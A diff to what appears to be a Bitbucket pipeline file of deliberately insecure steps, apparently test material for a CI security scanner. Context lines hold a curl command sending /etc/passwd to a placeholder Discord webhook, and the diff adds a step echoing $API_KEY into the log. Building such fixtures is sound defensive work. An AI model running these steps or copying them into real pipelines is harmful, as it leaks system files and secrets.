@@ -85,6 +85,11 @@ pipelines:
           # exfil of /etc/passwd.
           - 'curl -d "data=$(cat /etc/passwd)" https://discord.com/api/webhooks/1234567890/abcdefg'
 
+    # BB-032 — secret echoed to log.
+    - step:
+        script:
+          - echo "Key is $API_KEY"
+
 # BB-020 — full clone depth.
 clone:
   depth: full
